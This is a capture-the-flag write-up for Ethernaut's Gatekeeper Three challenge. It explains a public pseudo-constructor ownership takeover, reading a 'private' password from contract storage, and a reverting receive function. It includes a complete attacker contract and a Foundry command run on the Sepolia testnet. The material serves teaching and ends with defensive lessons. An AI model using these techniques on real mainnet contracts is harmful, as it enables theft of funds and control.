# Ethernaut Challenge 28 — Gatekeeper Three

This challenge requires you to pass three gatekeeper checks and register your EOA address (`tx.origin`) as the `entrant` on the `GatekeeperThree` contract.

Instance address:

```text
0x9F180F0f1dcb006B14fA4009c8F695AA50575470
```

---

## 🎯 Goal

Become the `entrant` by passing all three gates.

---

## 🧠 Understanding the Gates

### 🚪 Gate One: Owner Hijacking
```solidity
modifier gateOne() {
    require(msg.sender == owner);
    require(tx.origin != owner);
    _;
}
```
* The owner of the gatekeeper is checked against `msg.sender`.
* The visibility of the `construct0r()` function (which sets `owner = msg.sender`) is `public` rather than a constructor. Anyone can call it.
* By calling `construct0r()` from an intermediate attacker contract, the contract becomes the `owner`. When it subsequently calls `enter()`, `msg.sender` matches the owner (the contract address), but `tx.origin` is your EOA, satisfying `tx.origin != owner`.

### 🚪 Gate Two: Reading Private Storage
```solidity
modifier gateTwo() {
    require(allowEntrance == true);
    _;
}
```
* `allowEntrance` is set to `true` when calling `getAllowance(password)` if `trick.checkPassword(password)` succeeds.
* The `password` in the `SimpleTrick` contract is initialized with `block.timestamp` during construction and is marked as `private`.
* Since private state variables are fully readable on-chain via storage layouts, we can look up the `trick` address in slot `2` of `GatekeeperThree`, and then query the password stored at slot `2` of that `SimpleTrick` contract using `vm.load()`.

### 🚪 Gate Three: Reverting Transfers
```solidity
modifier gateThree() {
    if (address(this).balance > 0.001 ether && payable(owner).send(0.001 ether) == false) {
        _;
    }
}
```
* First, the contract balance must exceed `0.001 ether`. We can send `0.0015 ether` directly to the gatekeeper contract using a low-level call, which triggers its `receive()` function.
* Second, the gatekeeper's transfer of `0.001 ether` to the owner (our attacker contract) via `.send()` must fail (return `false`).
* By implementing a reverting fallback or `receive()` function in the attacker contract, any Ether transfer to it fails, satisfying the condition.

---

## 🛠️ Attacker Contract

To execute the exploit, I implemented the attacker contract [GatekeeperThreeAttacker.sol](./GatekeeperThreeAttacker.sol):

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {GatekeeperThree} from "./GatekeeperThree.sol";

contract GatekeeperThreeAttacker {
    GatekeeperThree public gatekeeper;
    uint256 public immutable password;

    constructor(address _gatekeeper, uint256 _password) {
        gatekeeper = GatekeeperThree(payable(_gatekeeper));
        password = _password;
    }

    function attack() external {
        gatekeeper.construct0r();
        gatekeeper.getAllowance(password);
        gatekeeper.enter();
    }

    receive() external payable {
        revert();
    }
}
```

---

## 🚀 Solve on Sepolia

We executed the exploit using our automated Foundry script `script/28-GatekeeperThree.s.sol`. The script deploys `SimpleTrick` on-chain (if not already deployed), queries its storage for the password, funds the contract, deploys `GatekeeperThreeAttacker`, and runs `attack()`.

Execute it using:
```bash
forge script script/28-GatekeeperThree.s.sol:GatekeeperThreeSolution --rpc-url sepolia --broadcast
```

### 📜 My Transactions

* **SimpleTrick Contract Deploy**: [0x3e22c645db3b744c9ece5da4649c3a66af2ba650763472e706cb1de5740a19c4](https://sepolia.etherscan.io/tx/0x3e22c645db3b744c9ece5da4649c3a66af2ba650763472e706cb1de5740a19c4)
* **GatekeeperThreeAttacker Deploy**: [0x8909dad5ce5e26dc393387dcd16d389a5b31adb789b8b96eb92ae642ec422271](https://sepolia.etherscan.io/tx/0x8909dad5ce5e26dc393387dcd16d389a5b31adb789b8b96eb92ae642ec422271)
* **Send Ether to Gatekeeper**: [0x862eeb70e40b02f1676a0dbf2ed2d10f9cbeb9133f11ab00f21ec45f0334478f](https://sepolia.etherscan.io/tx/0x862eeb70e40b02f1676a0dbf2ed2d10f9cbeb9133f11ab00f21ec45f0334478f)
* **Attack Execution**: [0xe220f04593039d8edc089504251fc2d61298110f6b94c1c4caa78a01f033d448](https://sepolia.etherscan.io/tx/0xe220f04593039d8edc089504251fc2d61298110f6b94c1c4caa78a01f033d448)
* **Exploit Block**: 11037749

---

## 🛡️ Security Takeaways
* **Constructor name typo**: Ensure compiler compatibility and naming matches correctly. Always use the standard `constructor` keyword instead of named public functions to prevent critical initialization takeover.
* **Nothing is private on public blockchains**: Variables marked `private` are still readable. Never store passwords, secrets, or confidential values in plaintext in contract storage.
* **Handle low-level transfer return values**: When sending Ether, be aware that low-level calls like `.send()` and `.transfer()` can fail (due to custom contract revert logic or out-of-gas errors). Always check their return values or anticipate that they can return false/fail.
